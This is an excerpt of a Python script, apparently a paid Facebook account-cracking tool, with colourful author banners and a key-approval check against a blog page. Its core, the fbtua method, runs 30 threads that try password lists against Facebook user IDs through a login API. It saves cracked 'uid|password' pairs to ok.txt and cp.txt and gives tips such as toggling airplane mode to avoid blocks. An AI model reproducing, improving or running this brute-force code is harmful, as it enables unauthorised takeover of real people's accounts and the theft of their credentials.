...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Twoaha Ibn Jalal\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 :3.1\x1b[0m\x1b[1;97m] \033[1;37m
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Twoaha Ibn Jalal\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : Twoaha\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : Nilay Kabir\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────×
 """)
...
def helpnote():
        print("%s [=>] DO YOU GET OTHER FREE COMMAND IF GET TO MESSEGE IN MY FACEBOOK  :)"%(G))
        #yahan nichy httsp sy hata kr apna github aproval link dalna
        subprocess.check_output(["am", "start", "https://github.com/Twoaha/TWOAHA.Approval.txt/blob/main/Twoaha.Approval.txt"])
        #yahan apni facebook id link dalna
        exit(" [=>] FACEBOOK :  https://www.facebook.com/profile.php?id=100069864289608 ")
...
def notice():
        ...
        os.system("xdg-open https://wa.me/+8801990953195?app=fbl")
        runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
        runtxt("\033[0;97m Do You Need Approval If Need Approval to Messege Me In Whatsapp ")
        os.system("xdg-open https://wa.me/+8801990953195?text=")
        subprocess.check_output(["am", "start", "https://wa.me/+8801990953195?text="])
...
class Main:
        def __init__(self):
                ...
                try:
                        ...
                        plr = requests.get('https://ahmedfarhan1736.blogspot.com/2024/04/newapp.html?m=1').text
                        if basesplit in plr:
                                key = basesplit
...
───────────────────────────────────────────────────────×
    """)
                ...
                subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100069864289608"])
                print("───────────────────────────────────────────────────────× ")
        ...
        def fbtua(self):
                ...
                try:
                        ...
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                ...
                                logo2()
                                print("───────────────────────────────────────────────────────× ")
                                print("\033[0;92m[=×>]\033[0;92m NOTE : BEFORE LOG IN CP ID CLEAR YOUR FACEBOOK APP DATA ")
                                print("\033[0;92m[=×>]\033[0;92m NOTE : TRY TO LOG IN CP ID AFTER 15 DAYS " )
                                print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY PAID TOOL")
                                print("\033[0;92m[=×>]\033[0;92m NOTE : TURN ON AIRPLANE MODE AFTER 10 SECOND ")
                                print("\033[0;97m───────────────────────────────────────────────────────× ")
                                for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
                ...
                for pw in pwx:
                        ...
                        if "session_key" in response.text and "EAAA" in response.text:
                                print("\r  \033[0;97m   [=Twoaha=OK=>] %s | %s\033[0;97m         "%(uid, pw))
                                self.ok.append("%s|%s"%(uid, pw))
                                open("ok.txt","a").write("   [=Twoaha=OK=>]  %s|%s\n"%(uid, pw))
                                break
                        elif "www.facebook.com" in response.json()["error_msg"]:
                                print("\r  \033[0;92m   [=Twoaha=OK=>] %s | %s\033[0;97m         "%(uid, pw))
                                self.cp.append("%s|%s"%(uid, pw))
                                open("cp.txt","a").write("   [=Twoaha=OK=>]  %s|%s\n"%(uid, pw))
                                break
                        else:
                                continue
